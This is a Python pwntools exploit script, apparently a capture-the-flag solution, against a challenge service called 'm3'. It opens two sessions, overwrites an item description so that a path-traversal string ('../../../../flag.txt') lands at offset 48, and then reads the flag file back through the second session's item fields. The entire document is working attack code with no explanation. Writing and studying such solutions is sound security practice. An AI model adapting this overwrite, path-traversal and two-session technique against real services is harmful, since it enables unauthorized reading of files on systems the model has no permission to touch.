#!/usr/bin/env python3

from pwn import gdb, remote, process, p32, context, ELF, args, fit, log
import time
import os

exe = context.binary = ELF('m3')

HOST = os.environ.get("HOST", "mmm.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15009))

io = remote(HOST, PORT)
io2 = remote(HOST, PORT)

io.sendlineafter(b":", b"1")
io.sendlineafter(b":", b"1")
io.sendlineafter(b":", b"a"*0x20)

io.recvuntil(b"Item ID: ")
id = io.recvline()[:-2]
io.recvuntil(b"Item secret token: ")
token = io.recvline()[:-2]
log.success(f"ID {id}")
log.success(f"Token {token}")

io.sendlineafter(b":", b"2")
io.sendlineafter(b":", id)

io.sendlineafter(b":", token)
io.sendlineafter(b":", b"2")

io2.sendlineafter(b":", b"2")
io2.sendlineafter(b":", id)

io.sendlineafter(b"Insert new description (up to 1023 characters): ", fit({
    48: b"../../../../../../../../flag.txt"
}))
io.sendlineafter(b":", b"3")
io.sendlineafter(b":", b"0")
io.sendlineafter(b":", b"0")
io.recvuntil(b"Exit")

io.close()
time.sleep(1)

io2.sendlineafter(b":", token)
io2.sendlineafter(b":", b"4")

io2.recvuntil(b"flag.txt")
io2.recvuntil(b"Make your selection: ")
io2.recvuntil(b"Item secret token: ")
flag = io2.recvline().strip()
io2.recvuntil(b"Item price: ")
flag += p32(int(io2.recvline().strip()))
io2.recvuntil(b"Item description: ")
io2.recvline()
flag += io2.recvline().strip()

print(flag.decode('ascii'))

io2.close()
